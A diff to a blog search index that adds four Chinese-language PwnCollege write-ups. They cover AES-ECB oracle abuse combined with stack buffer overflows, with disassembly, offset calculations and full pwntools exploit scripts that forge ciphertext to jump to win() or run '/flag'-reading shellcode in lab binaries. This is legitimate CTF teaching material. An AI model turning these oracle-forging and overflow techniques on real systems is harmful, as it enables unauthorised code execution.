@@ -8617,4 +8617,133 @@ bash 里跑，传递的环境变量不同：</p>
         <tag>pwncollege</tag>
       </tags>
   </entry>
+  <entry>
+    <title>PwnCollege - IS ECB-to-Shellcode (easy)</title>
+    <url>/wp/PwnCollege/PwnCollege-is-ecb-to-shellcode-easy/</url>
+    <content><![CDATA[<p>与 ECB-to-Win 类似的 ECB oracle + buffer overflow，但没有
+<code>win()</code> 函数，需要注入 shellcode 并跳转执行。栈可执行。</p>
+<h2 id="source">Source</h2>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">challenge</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">16</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">char</span> header[<span class="number">8</span>];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> length;</span><br><span class="line">        <span class="type">char</span> message[<span class="number">48</span>];  <span class="comment">// 比 win 版本更小</span></span><br><span class="line">    &#125; plaintext = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... 同样的 ECB 解密流程 ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// buffer overflow</span></span><br><span class="line">    EVP_DecryptUpdate(ctx, plaintext.message, &amp;decrypted_len,</span><br><span class="line">                      ciphertext + <span class="number">16</span>, ciphertext_len - <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 会打印反汇编后的 shellcode 和栈布局</span></span><br><span class="line">    print_disassembly(plaintext.message, decrypted_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="analysis">Analysis</h2>
+<p>从 stack dump 中读取关键信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| 0x7fffffffec90 (rsp+0x0040) | message buffer 开始 (shellcode 放这里)</span><br><span class="line">| ...                          | 104 bytes to saved rip</span><br><span class="line">| 0x7fffffffecf8 (rsp+0x00a8) | saved return address</span><br></pre></td></tr></table></figure>
+<ul>
+<li>buffer 起始: <code>0x7fffffffec90</code></li>
+<li>offset = <code>0xa8 - 0x40</code> = <strong>104 bytes</strong></li>
+<li>栈地址固定（ASLR 未随机化栈），直接将返回地址覆盖为 buffer
+起始地址</li>
+</ul>
+<h2 id="exploit">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">OFFSET = <span class="number">104</span></span><br><span class="line">BUFFER_ADDR = <span class="number">0x7fffffffec90</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block</span>(<span class="params">block_data</span>):</span><br><span class="line">    p = process([<span class="string">&quot;/challenge/dispatch&quot;</span>], level=<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    p.send(block_data)</span><br><span class="line">    p.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    ct = p.recvall()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> ct[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_payload</span>():</span><br><span class="line">    shellcode = asm(shellcraft.cat(<span class="string">&quot;/flag&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># shellcode + nop sled + return address</span></span><br><span class="line">    raw_payload = shellcode.ljust(OFFSET, <span class="string">b&quot;\x90&quot;</span>) + p64(BUFFER_ADDR)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取合法的第一个 block 密文</span></span><br><span class="line">    p_init = process([<span class="string">&quot;/challenge/dispatch&quot;</span>], level=<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    p_init.send(<span class="string">b&quot;\x90&quot;</span> * <span class="number">16</span>)</span><br><span class="line">    p_init.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    first_block_ct = p_init.recvall()[:<span class="number">16</span>]</span><br><span class="line">    p_init.close()</span><br><span class="line"></span><br><span class="line">    padded_payload = pad(raw_payload, <span class="number">16</span>)</span><br><span class="line">    final_ct = first_block_ct</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padded_payload), <span class="number">16</span>):</span><br><span class="line">        final_ct += encrypt_block(padded_payload[i : i + <span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">f&quot;Payload length: <span class="subst">&#123;<span class="built_in">len</span>(final_ct)&#125;</span> bytes&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> final_ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    payload = build_payload()</span><br><span class="line">    target = process(<span class="string">&quot;/challenge/vulnerable-overflow&quot;</span>, env=&#123;&#125;)</span><br><span class="line">    target.send(payload)</span><br><span class="line">    target.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(target.recvall().decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>pwncollege</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PwnCollege - IS ECB-to-Shellcode (hard)</title>
+    <url>/wp/PwnCollege/PwnCollege-is-ecb-to-shellcode-hard/</url>
+    <content><![CDATA[<p>同 easy 版本的 ECB oracle + shellcode 注入，但没有 stack
+dump，需要手动逆向 offset。</p>
+<h2 id="analysis">Analysis</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge&quot;</span> /challenge/vulnerable-overflow</span><br></pre></td></tr></table></figure>
+<p>关键溢出点：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; plaintext struct 起始于 s1 = rbp - 0x70</span><br><span class="line">│           0x004016d3      lea rsi, [s1]           ; rbp - 0x70</span><br><span class="line">; message buffer = s1 + 0x10 (跳过 header + length)</span><br><span class="line">│           0x004016d7      add rsi, 0x10           ; rbp - 0x60</span><br><span class="line">; buffer overflow</span><br><span class="line">│           0x004016e1      call sym.imp.EVP_DecryptUpdate</span><br></pre></td></tr></table></figure>
+<ul>
+<li>message buffer: <code>rbp - 0x60</code></li>
+<li>saved rip: <code>rbp + 0x08</code></li>
+<li>offset = <code>0x60 + 0x08</code> = <strong>104 bytes</strong> (与
+easy 版本相同)</li>
+</ul>
+<p>Exploit 完全相同，只需对应修改 buffer
+地址即可。实际上因为栈地址固定且相同，exploit 代码可以直接复用。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>pwncollege</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PwnCollege - IS ECB-to-Win (hard)</title>
+    <url>/wp/PwnCollege/PwnCollege-is-ecb-to-win-hard/</url>
+    <content><![CDATA[<p>同 easy 版本的 dispatch oracle 和 ECB block-by-block
+加密策略，区别在于没有 stack dump 提示，需要手动逆向 offset。</p>
+<h2 id="analysis">Analysis</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge; pdf @ sym.win&quot;</span> /challenge/vulnerable-overflow</span><br></pre></td></tr></table></figure>
+<p>关键溢出点：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; plaintext struct 起始于 s1 = rbp - 0x60</span><br><span class="line">│           0x0040173b      lea rsi, [s1]           ; rbp - 0x60</span><br><span class="line">; message buffer = s1 + 0x10 (跳过 8 字节 header + 8 字节 length)</span><br><span class="line">│           0x0040173f      add rsi, 0x10           ; rbp - 0x50</span><br><span class="line">; buffer overflow: 无长度限制</span><br><span class="line">│           0x00401749      call sym.imp.EVP_DecryptUpdate</span><br></pre></td></tr></table></figure>
+<ul>
+<li>message buffer 起始于 <code>rbp - 0x50</code></li>
+<li>saved rbp 在 <code>rbp + 0x00</code>，saved rip 在
+<code>rbp + 0x08</code></li>
+<li>offset = <code>0x50 + 0x08</code> = <strong>88 bytes</strong></li>
+</ul>
+<p><code>sym.win</code> 地址:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">│           0x004013b6      endbr64</span><br><span class="line">│           0x004013be      lea rdi, str.You_win__Here_is_your_flag:</span><br></pre></td></tr></table></figure>
+<p>→ <code>win() = 0x4013b6</code></p>
+<h2 id="exploit">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x50 (buffer to rbp) + 0x08 (saved rbp) = 88</span></span><br><span class="line">OFFSET = <span class="number">88</span></span><br><span class="line">WIN_ADDR = <span class="number">0x4013b6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block</span>(<span class="params">block_data</span>):</span><br><span class="line">    p = process([<span class="string">&quot;/challenge/dispatch&quot;</span>], level=<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    p.send(block_data)</span><br><span class="line">    p.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    ct = p.recvall()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> ct[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_payload</span>():</span><br><span class="line">    p_init = process([<span class="string">&quot;/challenge/dispatch&quot;</span>], level=<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    p_init.send(<span class="string">b&quot;A&quot;</span> * <span class="number">16</span>)</span><br><span class="line">    p_init.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    first_block_ct = p_init.recvall()[:<span class="number">16</span>]</span><br><span class="line">    p_init.close()</span><br><span class="line"></span><br><span class="line">    raw_payload = <span class="string">b&quot;A&quot;</span> * OFFSET + p64(WIN_ADDR)</span><br><span class="line">    padded_payload = pad(raw_payload, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    final_ct = first_block_ct</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padded_payload), <span class="number">16</span>):</span><br><span class="line">        final_ct += encrypt_block(padded_payload[i : i + <span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">f&quot;Payload length: <span class="subst">&#123;<span class="built_in">len</span>(final_ct)&#125;</span> bytes&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> final_ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    payload = build_payload()</span><br><span class="line">    target = process(<span class="string">&quot;/challenge/vulnerable-overflow&quot;</span>)</span><br><span class="line">    target.send(payload)</span><br><span class="line">    target.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(target.recvall().decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>pwncollege</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PwnCollege - IS ECB-to-Win (easy)</title>
+    <url>/wp/PwnCollege/PwnCollege-is-ecb-to-win-easy/</url>
+    <content><![CDATA[<blockquote>
+<p>Concepts used: Cryptography + Binary Exploitation</p>
+</blockquote>
+<h2 id="source">Source</h2>
+<p><code>vulnerable-overflow</code> 读取密文，先解密第一个 block 验证
+header 和 length，再解密剩余 block 到栈上固定大小的
+<code>message[60]</code>。因为 <code>ciphertext_len</code>
+没有上限检查，<code>EVP_DecryptUpdate</code> 会直接造成栈溢出。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">challenge</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">16</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">char</span> header[<span class="number">8</span>];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> length;</span><br><span class="line">        <span class="type">char</span> message[<span class="number">60</span>];</span><br><span class="line">    &#125; plaintext = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... key init, read ciphertext from stdin ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// verify first block</span></span><br><span class="line">    EVP_DecryptUpdate(ctx, (<span class="type">char</span> *)&amp;plaintext, &amp;decrypted_len, ciphertext, <span class="number">16</span>);</span><br><span class="line">    assert(<span class="built_in">memcmp</span>(plaintext.header, <span class="string">&quot;VERIFIED&quot;</span>, <span class="number">8</span>) == <span class="number">0</span>);</span><br><span class="line">    assert(plaintext.length &lt;= <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// buffer overflow: no bounds check on ciphertext_len</span></span><br><span class="line">    EVP_DecryptUpdate(ctx, plaintext.message, &amp;decrypted_len,</span><br><span class="line">                      ciphertext + <span class="number">16</span>, ciphertext_len - <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>dispatch</code> 是加密 oracle，接受最多 16 字节的 message，拼上
+<code>VERIFIED</code> header 后用相同 key 的 AES-ECB 加密输出：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="built_in">open</span>(<span class="string">&quot;/challenge/.key&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">cipher = AES.new(key=key, mode=AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">message = sys.stdin.buffer.read1()</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(message) &lt;= <span class="number">16</span>, <span class="string">&quot;Your message is too long!&quot;</span></span><br><span class="line">plaintext = <span class="string">b&quot;VERIFIED&quot;</span> + struct.pack(<span class="string">b&quot;&lt;Q&quot;</span>, <span class="built_in">len</span>(message)) + message</span><br><span class="line">ciphertext = cipher.encrypt(pad(plaintext, cipher.block_size))</span><br><span class="line">sys.stdout.buffer.write(ciphertext)</span><br></pre></td></tr></table></figure>
+<h2 id="analysis">Analysis</h2>
+<p>ECB 模式下每个 16 字节 block 独立加密，相同明文 block 产生相同密文
+block。因此可以：</p>
+<ol type="1">
+<li>调用 <code>dispatch</code> 获取合法的第一个 block（包含
+<code>VERIFIED</code> header）的密文</li>
+<li>将 payload 按 16 字节分块，逐块调用 <code>dispatch</code> 加密</li>
+<li>拼接密文发送给
+<code>vulnerable-overflow</code>，解密后得到我们的任意 payload</li>
+</ol>
+<p>从 stack dump 中可以看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| 0x00007fff9c9fad20 (rsp+0x0040) | message buffer 开始位置</span><br><span class="line">| ...                              | 120 bytes of &#x27;A&#x27; padding</span><br><span class="line">| 0x00007fff9c9fad98 (rsp+0x00b8) | saved return address -&gt; 0x401e96</span><br></pre></td></tr></table></figure>
+<ul>
+<li>buffer 起始: <code>rsp+0x40</code>，saved rip: <code>rsp+0xb8</code>
+→ offset = <strong>120 bytes</strong></li>
+<li><code>win()</code> 地址: <code>0x4018f7</code></li>
+</ul>
+<h2 id="exploit">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">OFFSET = <span class="number">120</span></span><br><span class="line">WIN_ADDR = <span class="number">0x4018f7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block</span>(<span class="params">block_data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;调用 dispatch 加密单个 16 字节 block，返回对应密文&quot;&quot;&quot;</span></span><br><span class="line">    p = process([<span class="string">&quot;/challenge/dispatch&quot;</span>], level=<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    p.send(block_data)</span><br><span class="line">    p.shutdown(<span class="string">&quot;send&quot;</span>)  <span class="comment"># 必须发送 EOF，否则 read1() 阻塞</span></span><br><span class="line">    ct = p.recvall()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span> ct[<span class="number">16</span>:<span class="number">32</span>]  <span class="comment"># 跳过第一个 block (VERIFIED header)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_payload</span>():</span><br><span class="line">    <span class="comment"># 获取合法的第一个 block 密文 (通过 dispatch 加密任意 16 字节 message)</span></span><br><span class="line">    p_init = process([<span class="string">&quot;/challenge/dispatch&quot;</span>], level=<span class="string">&quot;error&quot;</span>)</span><br><span class="line">    p_init.send(<span class="string">b&quot;A&quot;</span> * <span class="number">16</span>)</span><br><span class="line">    p_init.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    first_block_ct = p_init.recvall()[:<span class="number">16</span>]</span><br><span class="line">    p_init.close()</span><br><span class="line"></span><br><span class="line">    raw_payload = <span class="string">b&quot;A&quot;</span> * OFFSET + p64(WIN_ADDR)</span><br><span class="line">    padded_payload = pad(raw_payload, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 逐块加密，拼接密文</span></span><br><span class="line">    final_ct = first_block_ct</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padded_payload), <span class="number">16</span>):</span><br><span class="line">        final_ct += encrypt_block(padded_payload[i : i + <span class="number">16</span>])</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">f&quot;Payload length: <span class="subst">&#123;<span class="built_in">len</span>(final_ct)&#125;</span> bytes&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> final_ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    payload = build_payload()</span><br><span class="line">    target = process(<span class="string">&quot;/challenge/vulnerable-overflow&quot;</span>)</span><br><span class="line">    target.send(payload)</span><br><span class="line">    target.shutdown(<span class="string">&quot;send&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(target.recvall().decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>pwncollege</tag>
+      </tags>
+  </entry>
 </search>
